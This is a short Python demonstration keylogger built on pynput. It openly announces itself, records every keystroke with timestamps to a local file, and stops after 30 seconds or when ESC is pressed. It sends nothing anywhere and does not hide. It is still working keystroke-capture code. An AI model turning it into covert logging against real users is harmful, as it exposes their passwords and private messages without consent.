from pynput import keyboard
import logging
import threading

logging.basicConfig(
    filename="register.txt",
    level=logging.DEBUG,
    format="%(asctime)s.%(msecs)03d - %(message)s",
    datefmt="%H:%M:%S"
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def stop():
    listener.stop()
    print('\nKeylogger stopped automatically after 30 seconds.')

print("Keylogger active. Write something. It will stop automatically after 30 seconds or press ESC to stop it manually.")

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
threading.Timer(30, stop).start()
listener.start()
listener.join()

print("Review the 'register.txt' file to see the logged keystrokes.")